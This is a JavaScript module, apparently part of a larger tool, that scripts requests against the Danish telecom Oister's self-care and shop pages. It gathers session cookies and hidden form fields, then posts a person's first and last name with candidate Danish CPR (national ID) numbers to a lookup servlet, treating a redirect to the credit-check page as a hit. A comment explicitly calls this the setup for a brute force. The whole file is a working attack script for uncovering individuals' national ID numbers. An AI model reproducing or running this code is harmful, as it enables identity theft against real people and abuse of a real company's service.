// include base vendor object
var vendorBase = require("../Vendor.js"),
	Curl = require("../Curl.js");
	debug = require("../backend/debug.js");		

// include jquery
var $ = require("jquery");

// create new vendor object
var Vendor = {

	/**
	 * Prepare request by setting data and options
	 *********************/	
	setRequest: function(inputData, callback){				
	
		// Clone vendor base and set data and options
		var Oister = Object.create(vendorBase, {
		
			// set post data to submit
			data: { value: {
				account_type: '0',
				users__personal_id: '',
				users__first_name: inputData.firstName,
				users__last_name: inputData.lastName,				
				JSESSION: ''
			}},			
			
			// set request headers
			options: { value: {
				path: 'https://www.oister.dk/selfcare/servlet/VoisterSavePersonalIDLookup',
				method: 'POST'
			}},
			
			// set additional settings
			settings: { value: { formatting: {
				JSESSION: {
					filter: ';jsession=%(JSESSIONID)s',
					type: 'cookie'
				},
				users__personal_id: {
					type: 'cpr'
				}
			}}},			
			
			/**
			 * Extend object: receive response
			 ********************/
			getResponse: { value: function(data, res, html, callback){				
				var location = res.headers.location;

				if(location.indexOf("https://www.oister.dk/selfcare/servlet/VoisterCheckCredit?uid=") != -1){
					var status = "success";
				}else{
					var status = "error";
				}
				callback(data.cpr, status);
			}}			
		});
		
		/*
		 * Pre processing before brute force. Will only be done once!
		 *********************/
		 
		// variables throughout the processing
		var data_step4 = {};
		
		// STEP 1: get session cookie
		var cookieUrl = 'http://oister.dk/selfcare/servlet/LoginFramePassive';
		Oister.getCookie(cookieUrl, function(cookie){ 
			// append cookie
			Oister.options.cookie = cookie;
			//console.log("STEP 2");
			//console.log(cookie);						
		});		
		
		// STEP 2: get ASP session cookie
		var cookieUrl = 'https://www.oister.dk/Mobil/Shopflow/Basket/?product=152';
		Oister.getCookie(cookieUrl, function(cookie){ 
			// append cookie
			Oister.options.cookie = Oister.options.cookie + ';' + cookie;
			//console.log("STEP 2");
			//console.log(Oister.options.cookie);
						
			
			// STEP 3: Pick number		
			Curl.scrape({ 
				path: 'https://www.oister.dk/Mobil/Shopflow/Vaelg-nummer/',
				method: 'GET',
				cookie: Oister.options.cookie
			}, {}, function(data, vendor_response, html){
				var phonenumber = $(html).find('#number-grid input#newnumberrs4').val();
				
				// set data: phone number
				data_step4.numbers = phonenumber;
				
				// set data: hidden fields				
				var hiddenFields = $(html).find('#aspnetForm input[type=hidden]').not('[name=__VIEWSTATE]');
				
				$.each(hiddenFields, function(key, elm) { 
					var name = $(elm).attr('name');
					var value = $(elm).val()
					data_step4[name] = value;
					debug("hidden fields", name + value, 0, "vendor");										
				});
				
				// STEP 4: Post number + hidden fields
				try {
					Curl.scrape({ 
						path: 'https://www.oister.dk/Mobil/Shopflow/ConfirmPage/?numb=' + phonenumber.substring(0, 8),
						method: 'POST',
						cookie: Oister.options.cookie				
					}, data_step4, function(data, vendor_response, html){
						//console.log("STEP 4");
						//console.log(html);
			
						// signal finished
						callback(Oister);
				
					});	
				}catch(e){
					debug("Step 4", e, 3);
				}// end step 4

			}); // end step 3						
		}); // end step 2
		
	}
}

// export Vendor object
module.exports = Vendor;
